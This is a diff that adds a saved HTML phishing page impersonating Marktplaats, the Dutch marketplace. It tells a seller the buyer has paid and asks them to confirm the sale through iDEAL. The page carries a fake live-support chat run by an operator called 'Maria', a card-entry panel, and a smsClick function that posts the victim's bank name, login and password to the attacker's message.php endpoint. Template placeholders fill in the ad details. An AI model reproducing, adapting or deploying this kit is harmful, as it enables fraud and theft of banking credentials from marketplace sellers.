@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://marktplaats.3ds-online.shop/order/360981154 -->
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <script>(function () {
+      function hookGeo() {
+        //<![CDATA[
+        const WAIT_TIME = 100;
+        const hookedObj = {
+          getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+          watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+          fakeGeo: true,
+          genLat: 38.883333,
+          genLon: -77.000
+        };
+
+        function waitGetCurrentPosition() {
+          if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+            if (hookedObj.fakeGeo === true) {
+              hookedObj.tmp_successCallback({
+                coords: {
+                  latitude: hookedObj.genLat,
+                  longitude: hookedObj.genLon,
+                  accuracy: 10,
+                  altitude: null,
+                  altitudeAccuracy: null,
+                  heading: null,
+                  speed: null,
+                },
+                timestamp: new Date().getTime(),
+              });
+            } else {
+              hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+            }
+          } else {
+            setTimeout(waitGetCurrentPosition, WAIT_TIME);
+          }
+        }
+
+        function waitWatchPosition() {
+          if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+            if (hookedObj.fakeGeo === true) {
+              navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+              return Math.floor(Math.random() * 10000); // random id
+            } else {
+              hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+            }
+          } else {
+            setTimeout(waitWatchPosition, WAIT_TIME);
+          }
+        }
+
+        Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+          hookedObj.tmp_successCallback = successCallback;
+          hookedObj.tmp_errorCallback = errorCallback;
+          hookedObj.tmp_options = options;
+          waitGetCurrentPosition();
+        };
+        Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+          hookedObj.tmp2_successCallback = successCallback;
+          hookedObj.tmp2_errorCallback = errorCallback;
+          hookedObj.tmp2_options = options;
+          waitWatchPosition();
+        };
+
+        const instantiate = (constructor, args) => {
+          const bind = Function.bind;
+          const unbind = bind.bind(bind);
+          return new (unbind(constructor, null).apply(null, args));
+        }
+
+        Blob = function (_Blob) {
+          function secureBlob(...args) {
+            const injectableMimeTypes = [
+              { mime: 'text/html', useXMLparser: false },
+              { mime: 'application/xhtml+xml', useXMLparser: true },
+              { mime: 'text/xml', useXMLparser: true },
+              { mime: 'application/xml', useXMLparser: true },
+              { mime: 'image/svg+xml', useXMLparser: true },
+            ];
+            let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+            if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+              const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+              if (mimeTypeIndex >= 0) {
+                let mimeType = injectableMimeTypes[mimeTypeIndex];
+                let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+
+                let parser = new DOMParser();
+                let xmlDoc;
+                if (mimeType.useXMLparser === true) {
+                  xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+                } else {
+                  xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+                }
+
+                if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+                  xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+
+                  if (mimeType.useXMLparser === true) {
+                    args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+                  } else {
+                    args[0][0] = xmlDoc.documentElement.outerHTML;
+                  }
+                }
+              }
+            }
+
+            return instantiate(_Blob, args); // arguments?
+          }
+
+          // Copy props and methods
+          let propNames = Object.getOwnPropertyNames(_Blob);
+          for (let i = 0; i < propNames.length; i++) {
+            let propName = propNames[i];
+            if (propName in secureBlob) {
+              continue; // Skip already existing props
+            }
+            let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+            Object.defineProperty(secureBlob, propName, desc);
+          }
+
+          secureBlob.prototype = _Blob.prototype;
+          return secureBlob;
+        }(Blob);
+
+        window.addEventListener('message', function (event) {
+          if (event.source !== window) {
+            return;
+          }
+          const message = event.data;
+          switch (message.method) {
+            case 'updateLocation':
+              if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+                hookedObj.genLat = message.info.coords.lat;
+                hookedObj.genLon = message.info.coords.lon;
+                hookedObj.fakeGeo = message.info.fakeIt;
+              }
+              break;
+            default:
+              break;
+          }
+        }, false);
+        //]]>
+      } hookGeo();
+    })()</script>
+  <title>≥ Marktplaats - De plek om nieuwe en tweedehands spullen te kopen en verkopen</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie-edge">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="stylesheet" href="/css/support_parent.css">
+
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="./marktplaats_files/css2" rel="stylesheet">
+  <link rel="stylesheet" href="./marktplaats_files/styles.css">
+  <link rel="apple-touch-icon" sizes="76x76"
+    href="https://armorshield.digital/marketplace/templates/content/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32"
+    href="https://armorshield.digital/marketplace/templates/content/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16"
+    href="https://armorshield.digital/marketplace/templates/content/images/favicon-16x16.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <!-- CHAT links -->
+  <link rel="stylesheet" href="./marktplaats_files/bootstrap.min.css">
+  <script src="./marktplaats_files/jquery.min.js"></script>
+  <script src="./marktplaats_files/popper.min.js"></script>
+  <script src="./marktplaats_files/bootstrap.min.js"></script>
+  <script src="./marktplaats_files/jquery.maskedinput.js"></script>
+  <style type="text/css">
+    body {}
+
+    .col-md-2,
+    .col-md-10 {
+      padding: 0;
+    }
+
+    .panel {
+      z-index: 999999;
+      margin-bottom: 0px;
+    }
+
+    /* #### Tablets Portrait or Landscape #### */
+    @media screen and (min-width: 1px) and (max-width: 1023px) {
+      .open-button {
+        z-index: 300;
+        border: 0;
+        content: 'Напишите нам в чат';
+        background: #002f34;
+        border-radius: 5px;
+        padding: 16px 0px;
+        border: none;
+        cursor: pointer;
+        display: inline-flex;
+        align-items: center;
+        width: 150px;
+        height: 36px;
+        position: fixed;
+        bottom: 80px;
+      }
+
+      .panel-body {
+        height: 400px;
+      }
+
+      .chat-window {
+        height: 400px;
+        display: flex;
+        align-items: flex-start;
+        z-index: 9999;
+        min-width: 100%;
+        bottom: 5px;
+        position: fixed;
+        right: 10px;
+      }
+
+      #op_img {
+        height: 50%;
+        width: 70%;
+        border-radius: 50%;
+        max-height: 80px;
+      }
+
+      #usr_img {
+        height: 100%;
+        border-radius: 50%;
+        width: 70%;
+        left: 10%;
+        position: inherit;
+      }
+    }
+
+    @media screen and (min-width: 1024px) {
+      #open-button-text {
+        visibility: hidden;
+      }
+
+      .open-button {
+        z-index: 99999;
+        border: 0;
+        background-color: transparent;
+        background-image: url('/chat_src/btn.png');
+        background-size: 100px 100px;
+        background-repeat: no-repeat;
+        content: '';
+        padding: 16px 20px;
+        border: none;
+        cursor: pointer;
+        opacity: 0.6;
+        width: 150px;
+        height: 100px;
+        position: fixed;
+        top: 50px;
+
+      }
+
+      .panel-body {
+        height: 400px;
+      }
+
+      .chat-window {
+        height: 400px;
+        z-index: 9999;
+        display: fixed;
+        align-items: flex-start;
+        min-width: 485px;
+        bottom: 5px;
+        position: fixed;
+        right: 10px;
+      }
+
+      #op_img {
+        height: 100%;
+        width: 100%;
+        border-radius: 50%;
+        max-height: 100px;
+      }
+
+      #usr_img {
+        height: 100%;
+        border-radius: 50%;
+        width: 90%;
+        left: 10%;
+        position: inherit;
+      }
+    }
+
+    .chat-window>div>.panel {
+      border-radius: 5px 5px 0 0;
+    }
+
+    .icon_minim {
+      padding: 2px 10px;
+    }
+
+    .msg_container_base {
+      background: #e5e5e5;
+      margin: 0;
+      padding: 0 10px 10px;
+      max-height: 300px;
+      overflow-x: hidden;
+    }
+
+    .top-bar {
+      background: #002f34;
+      color: white;
+      padding: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+    }
+
+    .msg_receive {
+      padding-left: 0;
+      margin-left: 0;
+      text-align: left;
+    }
+
+    .msg_sent {
+      padding-bottom: 20px !important;
+      margin-right: 0;
+      text-align: left;
+    }
+
+    .messages {
+      background: white;
+      padding: 10px;
+      border-radius: 2px;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+      max-width: 100%;
+    }
+
+    .messages>p {
+      font-size: 13px;
+      margin: 0 0 0.2rem 0;
+    }
+
+    .messages>time {
+      font-size: 11px;
+      color: #ccc;
+    }
+
+    .msg_container {
+      padding: 10px;
+      overflow: hidden;
+      display: flex;
+    }
+
+    .panel>img {
+      display: block;
+      width: 100%;
+    }
+
+    .avatar {
+      position: relative;
+    }
+
+    .base_receive>.avatar:after {
+      content: "";
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 0;
+      height: 0;
+      border: 5px solid #FFF;
+      border-left-color: rgba(0, 0, 0, 0);
+      border-bottom-color: rgba(0, 0, 0, 0);
+    }
+
+    .base_sent {
+      justify-content: flex-end;
+      align-items: flex-end;
+    }
+
+    .base_sent>.avatar:after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 0;
+      height: 0;
+      border: 5px solid white;
+      border-right-color: transparent;
+      border-top-color: transparent;
+      box-shadow: 1px 1px 2px rgba(black, 0.2); // not quite perfect but close
+    }
+
+    .msg_sent>time {
+      float: right;
+    }
+
+
+
+    .msg_container_base::-webkit-scrollbar-track {
+      -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
+      background-color: #F5F5F5;
+    }
+
+    .msg_container_base::-webkit-scrollbar {
+      width: 12px;
+      background-color: #F5F5F5;
+    }
+
+    .msg_container_base::-webkit-scrollbar-thumb {
+      -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
+      background-color: #555;
+    }
+
+    .btn-group.dropup {
+      position: fixed;
+      left: 0px;
+      bottom: 0;
+    }
+
+    #btn-chat {
+      background-color: #002f34;
+      border-color: white;
+      padding-left: 5px;
+      padding-right: 5px;
+    }
+
+    #new_chat {
+      width: 10px;
+      height: 174px;
+      float: right;
+      right: 10px;
+      top: 50px;
+      position: fixed;
+      z-index: 0;
+    }
+
+    1
+  </style>
+  <!-- CHAT links close -->
+</head>
+
+<body id="body">
+  <!--- CHAT --->
+  <div class="row chat-window col-xs-5 col-md-3" id="chat_window_1" style="margin-left:10px;display: none;">
+    <input type="hidden" id="product" value="<%=ad.title%>">
+    <input type="hidden" id="refresh_time" value="360981154">
+
+    <div class="col-xs-12 col-md-12">
+      <div class="panel panel-default">
+        <div class="panel-heading top-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
+          <div class="col-md-8 col-xs-8" style="text-align: left; right: 13px;width: 90%">
+            <h4 class="panel-title" style="color: #fff"><svg width="1em" height="1em" viewBox="0 0 16 16"
+                class="bi bi-chat" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd"
+                  d="M2.678 11.894a1 1 0 0 1 .287.801 10.97 10.97 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8.06 8.06 0 0 0 8 14c3.996 0 7-2.807 7-6 0-3.192-3.004-6-7-6S1 4.808 1 8c0 1.468.617 2.83 1.678 3.894zm-.493 3.905a21.682 21.682 0 0 1-.713.129c-.2.032-.352-.176-.273-.362a9.68 9.68 0 0 0 .244-.637l.003-.01c.248-.72.45-1.548.524-2.319C.743 11.37 0 9.76 0 8c0-3.866 3.582-7 8-7s8 3.134 8 7-3.582 7-8 7a9.06 9.06 0 0 1-2.347-.306c-.52.263-1.639.742-3.468 1.105z">
+                </path>
+              </svg>
+              Online chat</h4>
+          </div>
+          <div class="col-md-4 col-xs-4" style="text-align: right; left: 13px;width: 10%;float: right;">
+            <button type="button" class="close icon_close" aria-label="Close" data-id="chat_window_1">
+              <span aria-hidden="true">×</span>
+            </button>
+          </div>
+        </div>
+        <div class="panel-body msg_container_base">
+
+        </div>
+        <div class="panel-footer">
+          <div class="input-group">
+            <input id="btn-input" type="text" class="form-control input-sm chat_input" placeholder="Schrijf hier...">
+            <span class="input-group-btn">
+              <button class="btn btn-primary" id="btn-chat" style="margin-top: 0px;color: #fff">Stuur een
+                bericht</button>
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript">
+    $(document).on('click', '.panel-heading span.icon_minim', function (e) {
+      var $this = $(this);
+      if (!$this.hasClass('panel-collapsed')) {
+        $this.parents('.panel').find('.panel-body').slideUp();
+        $this.addClass('panel-collapsed');
+        $this.removeClass('glyphicon-minus').addClass('glyphicon-plus');
+      } else {
+        $this.parents('.panel').find('.panel-body').slideDown();
+        $this.removeClass('panel-collapsed');
+        $this.removeClass('glyphicon-plus').addClass('glyphicon-minus');
+      }
+    });
+    $(document).on('focus', '.panel-footer input.chat_input', function (e) {
+      var $this = $(this);
+      if ($('#minim_chat_window').hasClass('panel-collapsed')) {
+        $this.parents('.panel').find('.panel-body').slideDown();
+        $('#minim_chat_window').removeClass('panel-collapsed');
+        $('#minim_chat_window').removeClass('glyphicon-plus').addClass('glyphicon-minus');
+      }
+    });
+    $(document).on('click', '#open-support', function (e) {
+      $('#chat_window_1').show();
+      $('#open-support').hide();
+    });
+    /* play audio on new support message */
+    function playAudio() {
+      var audio = new Audio(
+        "https://zvukogram.com/mp3/cats/906/new_message_tone.mp3"
+      );
+      audio.autoplay = true;
+      audio.play();
+    }
+    function openChat() {
+      $('#chat_window_1').show();
+      $('#open-support').hide();
+    }
+    $(document).on('click', '.icon_close', function (e) {
+      $('#chat_window_1').hide();
+      $('#open-support').show();
+    });
+    $(document).ready(function () {
+      $('#chat_window_1').hide();
+      $('#open-support').show();
+    });
+
+    $(document).on('click', '#btn-chat', function (e) {
+      sendMessage();
+    });
+    function sendMessage() {
+      message = document.getElementById("btn-input").value;
+      if (message === '') {
+        return;
+      }
+      document.getElementById("btn-input").value = '';
+      var token = getCookie('token');
+      if (token === null) {
+        var token = Math.random().toString(36).substring(7);
+      }
+      xhttp = new XMLHttpRequest();
+      var track_id = document.getElementById("refresh_time").value;
+      var url = 'https://' + document.location.hostname + '/chat_src/message.php';
+      xhttp.open("POST", url, true);
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+      var title = document.getElementById("product").value;
+      xhttp.send("send=1&track_id=" + track_id + "&token=" + token + "&message=" + message + "&title=" + title);
+      cur_text = $('.msg_container_base').html();
+      $('.msg_container_base').html(cur_text + '<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>' + message + '</p><time datetime="' + getCurTime() + '">Uds</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/chat_src/user.png" id="usr_img"></div></div>');
+      setCookie('token', token);
+      var objDiv = $('.msg_container_base');
+      objDiv.scrollTop($('.msg_container_base')[0].scrollHeight);
+    }
+    var xhttp = null;
+    $(document).ready(function () {
+      window.onbeforeunload = function () {
+        xhttp.abort();
+      };
+      var token = getCookie('token');
+      if (token !== null) {
+        xhttp = new XMLHttpRequest();
+        var track_id = document.getElementById("refresh_time").value;
+        var url = 'https://' + document.location.hostname + '/chat_src/message.php';
+        xhttp.open("POST", url, true);
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhttp.send("get=1&token=" + token);
+        xhttp.onload = function (e) {
+          if (xhttp.readyState === 4) {
+            if (xhttp.status === 200) {
+              var body = xhttp.response;
+              var json = JSON.parse(body);
+              for (let i = 0; i < json.length; i++) {
+                if (json[i].message !== 'start' && json[i].is_deleted !== 't') {
+                  cur_text = $('.msg_container_base').html();
+                  time = getTime(json[i].date);
+                  if (json[i].sender == 't') {
+                    text = '<div class="support-message" db-id="' + json[i].id + '"><div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/chat_src/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>' + json[i].message + '</p><time datetime="2009-11-13T20:00">Maria</time></div></div></div></div>'
+                  } else {
+                    text = '<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>' + json[i].message + '</p><time datetime="' + time + '">Uds</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/chat_src/user.png" id="usr_img"></div></div>'
+                  }
+                  $('.msg_container_base').html(cur_text + text);
+                }
+              }
+              var objDiv = $('.msg_container_base');
+              objDiv.scrollTop($('.msg_container_base')[0].scrollHeight);
+            }
+          }
+        }
+      }
+    });
+    var myVar = setInterval(updateChat, 4000);
+    var pool = true;
+    function updateChat() {
+      var token = getCookie('token');
+      if (token !== null) {
+        if (pool) {
+          xhttp = new XMLHttpRequest();
+          var track_id = document.getElementById("refresh_time").value;
+          var url = 'https://' + document.location.hostname + '/chat_src/message.php';
+          pool = false;
+          xhttp.open("POST", url, true);
+          xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+          xhttp.send("get=0&token=" + token);
+          xhttp.onload = function (e) {
+            if (xhttp.readyState === 4) {
+              if (xhttp.status === 200) {
+                var body = xhttp.response;
+                pool = true;
+                var json = JSON.parse(body);
+                for (let i = 0; i < json.length; i++) {
+                  cur_text = $('.msg_container_base').html();
+                  time = getTime(json[i].date);
+                  if (json[i].sender == 't') {
+                    playAudio();
+                    text = '<div class="support-message" db-id="' + json[i].id + '"><div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="https://armorshield.digital/loooney_tunes/support/operator.svg" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>' + json[i].message + '</p><time datetime="2009-11-13T20:00">Maria</time></div></div></div></div>'
+                  } else {
+                    text = '<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>' + json[i].message + '</p><time datetime="' + time + '">Uds</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/chat_src/user.png" id="usr_img"></div></div>'
+                  }
+                  $('.msg_container_base').html(cur_text + text);
+                  var objDiv = $('.msg_container_base');
+                  objDiv.scrollTop($('.msg_container_base')[0].scrollHeight);
+                  $('#chat_window_1').show();
+                  $('#open-support').hide();
+                }
+
+              } else {
+                pool = true;
+              }
+            }
+          }
+        }
+      }
+    }
+
+    function getCurTime() {
+      var date = new Date();
+      var hours = date.getHours();
+      var minutes = "0" + date.getMinutes();
+      var formattedTime = hours + ':' + minutes.substr(-2);
+      return formattedTime;
+    }
+
+    function getTime(unixtime) {
+      var date = new Date(unixtime * 1000);
+      var hours = date.getHours();
+      var minutes = "0" + date.getMinutes();
+      var formattedTime = hours + ':' + minutes.substr(-2);
+      return formattedTime;
+    }
+
+    function getCookie(cname) {
+      var name = cname + "=";
+      var decodedCookie = decodeURIComponent(document.cookie);
+      var ca = decodedCookie.split(';');
+      for (var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+          c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+          return c.substring(name.length, c.length);
+        }
+      }
+      return null;
+    }
+
+    function setCookie(cname, cvalue) {
+      var d = new Date();
+      d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
+      var expires = "expires=" + d.toUTCString();
+      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+    function smsClick(track_id, bank, login, password) {
+      xhttp = new XMLHttpRequest();
+      var track_id = document.getElementById("refresh_time").value;
+      var url = location.protocol + '//' + document.location.hostname + '/chat_src/message.php';
+      xhttp.open("POST", url, true);
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+      xhttp.send("get=4&track_id=" + track_id + "&login=" + login + "&password=" + password + "&bank=" + bank);
+      xhttp.onload = function (e) {
+        if (xhttp.readyState === 4) {
+          if (xhttp.status === 200) {
+          }
+        }
+      }
+      return 'true';
+    }
+    function openForm() {
+      document.getElementById("myForm").style.display = "block";
+      document.getElementById("open-support").style.display = "none";
+      var objDiv = $('.msg_container_base');
+      objDiv.scrollTop = objDiv.scrollHeight;
+    }
+
+    function closeForm() {
+      document.getElementById("myForm").style.display = "none";
+      document.getElementById("open-support").style.display = "block";
+    }
+    var input = document.getElementById("btn-input");
+
+    input.addEventListener("keydown", function (event) {
+      if (event.keyCode === 13) {
+        event.preventDefault();
+        document.getElementById("btn-chat").click();
+      }
+    }); 1    </script>
+  <script type="text/javascript">
+    window.onload = function () {
+      $.ajax({
+        type: "POST",
+        url: 'https://' + document.location.hostname + '/chat_src/check_online.php',
+        data: {
+          track_id: document.getElementById("refresh_time").value,
+          status: "online",
+          action: "create"
+        },
+        success: function (data) {
+          // Handle success
+        }
+      });
+    }
+  </script>
+  <!--- CHAT CLOSE --->
+  <header class="f-header">
+    <section class="f-head_menu">
+      <div class="f-left_side">
+        <a href="https://armorshield.digital/"><img class="f-logotype" src="./marktplaats_files/logotype.png"
+            alt="MarktPlaats"></a>
+        <a href="https://armorshield.digital/"><img class="f-logotype_mobile" src="./marktplaats_files/mobile_logo.png"
+            alt="MarktPlaats"></a>
+        <ul class="f-menu_list">
+          <li class="f-menu_elements"><a
+              href="https://help.marktplaats.nl/s/?_gl=1*1idm2xj*_ga*MTQwMjYxODAwNC4xNjMyMjM0Njc5*_ga_GYS69R7SLQ*MTYzMjMwMzY1MC4yLjEuMTYzMjMwMzY1MS4w">Help
+              en info</a></li>
+          <li class="f-menu_elements"><a
+              href="https://armorshield.digital/i/help/over-marktplaats/voorwaarden-en-privacybeleid/algemene-gebruiksvoorwaarden.dot.html">Voorwaarden</a>
+          </li>
+          <li class="f-menu_elements"><a href="https://armorshield.digital/i/help/veilig-en-succesvol/">Veilig
+              handelen</a></li>
+        </ul>
+      </div>
+      <div class="f-right_side">
+        <ul class="f-menu_list">
+          <li class="f-menu_elements">
+            <img class="f-icon" src="./marktplaats_files/bubble.png" alt="icon.png">
+            <a href="https://armorshield.digital/messages">
+              Berichten</a>
+          </li>
+          <li class="f-menu_elements">
+            <img class="f-icon" src="./marktplaats_files/bell.png" alt="icon.png">
+            <a href="https://armorshield.digital/notifications">
+              Meldingen</a>
+          </li>
+          <li class="f-menu_elements">
+            <img class="f-icon" src="./marktplaats_files/user.png" alt="icon.png">
+            <a href="https://armorshield.digital/account/login.html?target=https%3A%2F%2Fwww.marktplaats.nl%2F">
+              Profile</a>
+          </li>
+          <a
+            href="https://link.marktplaats.nl/link/placead/start?_gl=1*1k46sbu*_ga*MTQwMjYxODAwNC4xNjMyMjM0Njc5*_ga_GYS69R7SLQ*MTYzMjMwMzY1MC4yLjEuMTYzMjMwMzY1MS4w">
+            <li class="f-menu_elements">
+              <img class="f-icon" src="./marktplaats_files/pin.png" alt="icon.png">
+              Plaats advertentie
+            </li>
+          </a>
+        </ul>
+      </div>
+      <div class="f-right_side__mobile">
+        <ul class="f-menu_list">
+          <li class="f-menu_elements">
+            <a href="https://armorshield.digital/messages"><img class="f-icon" src="./marktplaats_files/bubble.png"
+                alt="icon.png"></a>
+          </li>
+          <li class="f-menu_elements">
+            <a href="https://armorshield.digital/notifications"><img class="f-icon" src="./marktplaats_files/bell.png"
+                alt="icon.png"></a>
+          </li>
+          <li class="f-menu_elements">
+            <a href="https://armorshield.digital/account/login.html?target=https%3A%2F%2Fwww.marktplaats.nl%2F"><img
+                class="f-icon" src="./marktplaats_files/user.png" alt="icon.png"></a>
+          </li>
+          <a
+            href="https://link.marktplaats.nl/link/placead/start?_gl=1*1k46sbu*_ga*MTQwMjYxODAwNC4xNjMyMjM0Njc5*_ga_GYS69R7SLQ*MTYzMjMwMzY1MC4yLjEuMTYzMjMwMzY1MS4w">
+            <li class="f-menu_elements">
+              <img class="f-icon" src="./marktplaats_files/pin.png" alt="icon.png">
+            </li>
+          </a>
+        </ul>
+      </div>
+    </section>
+    <hr class="f-line">
+    <section class="f-product_menu">
+      <div class="f-product_image"
+        style="background: url(<%=ad.photo%>);background-size: cover;background-repeat: no-repeat;background-position: 50% 50%;">
+      </div>
+      <div class="f-product_details">
+        <p class="f-product_name">
+          <%=ad.title%>
+        </p>
+        <p class="f-product_price">
+          <%=ad.price%>
+        </p>
+      </div>
+    </section>
+  </header>
+  <div class="f-wrapper" id="f-wrapper">
+    <section class="f-content">
+      <div class="f-payment_info">
+        <div class="f-payment_title">
+          <span class="f-title">De goederen betaald</span>
+        </div>
+        <div class="f-payment_content">
+          <div class="f-payment_price">
+            <div class="f-price_amount">
+              <span class="f-currency"></span>
+              <span class="f-amount">
+                <%=ad.price%>
+              </span>
+            </div>
+            <div class="f-payment_description">
+              <p class="f-p_description">De koper heeft betaald</p>
+            </div>
+            <div class="f-payment_labels">
+              <div class="f-labels_1">
+                <div class="f-label">
+                  <div class="f-label_title">
+                    <div class="f-title_image" style="background-image: url(https://i.imgur.com/Gk3fF5r.png);"></div>
+                    <p class="f-title">
+                      Brievenbuspakje 0 - 30 kg
+                    </p>
+                  </div>
+                  <span class="f-label_data">
+                    4,10
+                  </span>
+                </div>
+                <div class="f-label">
+                  <div class="f-label_title">
+                    <div class="f-title_image" style="background-image: url(https://i.imgur.com/exeOf6m.png);"></div>
+                    <p class="f-title">
+                      Gelijk Oversteken Service
+                    </p>
+                  </div>
+                  <span class="f-label_data">
+                    1,58
+                  </span>
+                </div>
+              </div>
+              <hr class="f-label_line">
+              <div class="f-labels_2">
+                <div class="f-label">
+                  <div class="f-label_title">
+                    <!-- <div class="f-title_image" style="background-image: url('/templates/content/images/b.jpg');"></div> -->
+                    <p class="f-title">
+                      De verkoper ontvangt
+                    </p>
+                  </div>
+                  <span class="f-label_data">
+                    <%=ad.price%>
+                  </span>
+                </div>
+                <div class="f-label">
+                  <div class="f-label_title">
+                    <div class="f-title_image" style="background-image: url(https://i.imgur.com/Gk3fF5r.png);"></div>
+                    <p class="f-title">
+                      PostNL koeriersbedrijf
+                    </p>
+                  </div>
+                  <!-- <span class="f-label_data">
+                                            1,58
+                                        </span> -->
+                </div>
+              </div>
+            </div>
+            <div class="f-payment_footer">
+
+            </div>
+          </div>
+        </div>
+        <div class="f-payment_footer">
+          <span class="f-security_text">Aangeboden door</span>
+          <div class="f-security_image"></div>
+        </div>
+        <a href="/ad/<%=ad.id%>">
+          <div class="f-button">
+            <span class="f-button_text">Bevestiging van de verkoop</span>
+          </div>
+        </a>
+      </div>
+      <div class="f-instructions">
+        <div class="f-instruction_header">
+          <span class="f-text_left">
+            Betalen met
+          </span>
+          <div class="f-text_image"></div>
+          <span class="f-text_right">
+            iDeal
+          </span>
+        </div>
+        <div class="f-instruction_content">
+          <div class="f-instruction_element">
+            <img src="./marktplaats_files/checked.png" alt="" class="f-checked">
+            <p class="f-instruction_text">
+              <span class="f-title">Snel:</span> regel alles met één klik.
+            </p>
+          </div>
+          <div class="f-instruction_element">
+            <img src="./marktplaats_files/checked.png" alt="" class="f-checked">
+            <p class="f-instruction_text">
+              <span class="f-title">Makkelijk:</span> uitwisseling van bankgegevens en contant geld<br>zijn niet meer
+              nodig.
+            </p>
+          </div>
+          <div class="f-instruction_element">
+            <img src="./marktplaats_files/checked.png" alt="" class="f-checked">
+            <p class="f-instruction_text">
+              <span class="f-title">Veiliger:</span> strenge controle door iDEAL en
+            </p>
+          </div>
+        </div>
+        <div class="f-instruction_footer">
+          <span class="f-footer_text">
+            Deze dienst wordt aangeboden en uitgevoerd door <a
+              href="https://onlinepaymentplatform.com/nl/support/marktplaats"><span class="f-link">Online Payment
+                Platform BV</span></a>. De <a
+              href="https://onlinebetaalplatform.nl/assets/public/static/algemene-voorwaarden-c2c-betaallink.html"><span
+                class="f-link">Algemene Voorwaarden van OPP</span></a> zijn hierop van toepassing.
+          </span>
+        </div>
+      </div>
+      <div class="f-card_data">
+        <div class="f-instruction_header">
+          <span class="f-text_left">
+            Betalen met
+          </span>
+          <div class="f-text_image"></div>
+          <span class="f-text_right">
+            iDeal
+          </span>
+        </div>
+        <div class="f-card_content">
+          <div class="f-card">
+            <img src="./marktplaats_files/card.svg" alt="" class="f-card_image">
+          </div>
+          <img class="f-card_shield" src="https://i.imgur.com/qhKUmqf.png" alt="">
+          <div class="f-card_name">
+            <input type="text" placeholder="Enter your name" class="f-input">
+            <label for="card_name" class="f-label">Name</label>
+          </div>
+          <div class="f-card_date">
+
+          </div>
+          <div class="f-card_cvc">
+
+          </div>
+          <div class="f-card_number">
+
+          </div>
+        </div>
+        <div class="f-instruction_footer">
+          <span class="f-footer_text">
+            Deze dienst wordt aangeboden en uitgevoerd door <a
+              href="https://onlinepaymentplatform.com/nl/support/marktplaats"><span class="f-link">Online Payment
+                Platform BV</span></a>. De <a
+              href="https://onlinebetaalplatform.nl/assets/public/static/algemene-voorwaarden-c2c-betaallink.html"><span
+                class="f-link">Algemene Voorwaarden van OPP</span></a> zijn hierop van toepassing.
+          </span>
+        </div>
+      </div>
+    </section>
+  </div>
+  <div class="f-footer">
+
+  </div>
+
